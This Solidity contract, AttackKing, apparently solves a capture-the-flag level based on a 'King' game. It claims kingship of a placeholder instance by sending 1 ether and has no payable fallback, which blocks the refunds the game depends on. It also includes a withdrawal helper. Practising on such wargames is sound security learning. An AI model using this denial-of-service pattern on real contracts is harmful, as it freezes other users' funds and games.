pragma solidity ^0.4.0;

contract AttackKing {
    address kingAddress = YOUR_INSTANCE_ADDRESS;
    
     //Seed ether to this contract
    constructor() payable {
    }
    
    //Become the king
    function pwn() public {
        kingAddress.transfer(1 ether);
    } 
    
    //Returns any money in the contract... useful if you're slow like me and you keep deploying with the wrong address :'(
    function sendtoMe() public {
        msg.sender.transfer(address(this).balance);
    }
}